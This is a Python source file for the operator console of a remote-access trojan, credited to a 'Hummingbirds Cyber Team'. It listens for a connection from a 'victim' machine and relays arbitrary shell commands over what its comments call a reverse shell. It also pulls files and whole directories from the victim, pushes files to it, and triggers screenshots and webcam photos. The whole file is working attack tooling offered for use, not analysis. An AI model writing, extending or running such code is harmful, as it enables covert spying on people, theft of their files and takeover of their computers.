import socket
from os import system,chdir
import subprocess as sb

host=""
port=None
conn=None
addr=None
sock=None
files=None
file_names=None
additional_data=b""
help='''
                                            ~Hummingbirds Cyber Team~
        --------------------------------------------COMMANDS----------------------------------------------
        $exit --> Disconnect from victim.
	$download [name] --> Download the "name" file from the victim's computer.
        $download -dir [directory_name] --> Download the "directory_name" directory from the victim's computer.
        $upload [name] --> Upload the "name" file to victim's computer.
        $upload -dir [directory_name] --> Upload the "directory_name" directory to the victim's computer.
        $screenshot [name] --> Take a screenshot victim's computer screen and save it into victim's current
        directory as "name.png".
        $webcam [name] --> Take a photo using webcam and save it into victim directory as "name.png"
        $help --> Commands screen
        --------------------------------------------------------------------------------------------------
        '''
def main():
    try:
        print(help)      
        port=int(input("Which port do you want to listen? (Default:9999) : ") or "9999")
        connect(host,port)
      
    except Exception as e:
        print(e)

def connect(host,port):
    try:
        global conn,addr,sock
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        #To prevent this error,
        #OSError: [Errno 98] Address already in use
        s.bind(('', port))
        s.listen(1)
        print("Listening port {}".format(port))      
        conn,addr=s.accept()  
        
        print("Connection Successful > {}".format(addr[0]))
        '''
        Wait for an incoming connection.  Return a new socket
	representing the connection, and the address of the client.
	For IP sockets, the address info is a pair (hostaddr, port).
	'''   
           
        while True:
            cmd=input("~$ ")
            if cmd=="exit":
                conn.send(str.encode(cmd))#Send the command to client
                conn.close()
                s.close()
                exit()
                break
            
            elif (cmd.split()[0] =="help"):
                print(help)

            elif (cmd.split()[0] == "download"):
                #We must know whether it is file or directory.

                if(cmd.split()[1] == "-dir"):#download -dir {directoryname}
                    global files
                    name=cmd.split()[2]
                    system("mkdir {}".format(name))
                    chdir(name)                    

                    conn.send(str.encode("ls {}".format(name)))#Send the command to client
                    files=str(conn.recv(1024),"utf-8")
                    files=files.split("\n")
                 
                    print("Downloading..")
                    conn.send(str.encode(cmd))
                    ddownload_the_data(name)
                    chdir("..")
                    #We have to return old directory.
                    print("Process completed!")
                else:
                    name=cmd.split()[1]
                    print("Downloading..")
                    conn.send(str.encode(cmd))#Send the command to client
                    download_the_data(name)
                    print("Process completed!")
 
            elif (cmd.split()[0] == "screenshot"):
                conn.send(str.encode(cmd))#Send the command to client
                print("Screenshot!")

            elif (cmd.split()[0] == "webcam"):
                conn.send(str.encode(cmd))#Send the command to client
                print("Photo was taken!")

            elif (cmd.split()[0] == "upload"):
                if(cmd.split()[1] == "-dir"):
                    print("Uploading..")
                    global file_names
                    conn.send(str.encode(cmd))
                    directory_name=cmd.split()[2]
                    chdir(directory_name)
                    
                    p=sb.Popen(["ls"],stdout=sb.PIPE,stderr=sb.STDOUT)
                    #List the files in the directory.
                    file_names=str(p.communicate()[0],"utf-8")
                    #send files' names to client
                    conn.send(str.encode(file_names))
                    uupload_data(directory_name)
                    #Go back..
                    chdir("..")
                    print("Process completed!")
                else:
                    name=cmd.split()[1]
                    print("Uploading..")
                    conn.send(str.encode(cmd))#Send the command to client
                    upload_data(name)
                    print("Process completed!") 	            	
            elif (len(cmd) == 0):
                continue
                #We are trying to save the terminal before broken
                #If you wanna understand why this statement is here
                #Just delete it and try to hit just [enter] on the reverse shell.
            else:
                conn.send(str.encode(cmd))#Send the command to client
                data=str(conn.recv(1024),"utf-8")
                    
                #print("Length:",len(data))
                print(data,end="")#Receive the output of the sending command
                

    except Exception as e:
        print(e)
    
    finally:
        s.close()
        exit()
    
def download_the_data(filename):#For files   
    with open(filename,"wb") as file:       
        while True:           
            data=conn.recv(1024)
            if (b"hmmn" in data):
                file.write(data[:-4])
                break
            file.write(data)

def upload_data(filename):
    with open(filename,"rb") as file:
        for data in file:
            conn.sendall(data)
        conn.send(b"hmmn")
             
def ddownload_the_data(directory):#For directories
    global additional_data
    #We created the directory and go in.
    #Now we must know the file names in the direc.
    if("" in files): 
        files.remove("")
    print(files)
    for file in files:
        with open(file,"wb") as f:
            if (additional_data):
                f.write(additional_data)
                additional_data=None                  
            while True:
                data=conn.recv(1024)
                if (b"hmmn" in data):
                    index=data.index(b"hmmn")
                    f.write(data[:index])
                    additional_data=data[index+4:]
                    break
                f.write(data)

def uupload_data(directory_name):
    global file_names
    file_names = file_names.split("\n")
    # If you wanna understand, print the first "file_names".

    if ("" in file_names):
        file_names.remove("")
        #To prevent exception

    for file in file_names:
        with open(file,"rb") as f:
            for data in f:
                conn.sendall(data)
            conn.send(b"hmmn")

if __name__=="__main__":
    main()

         
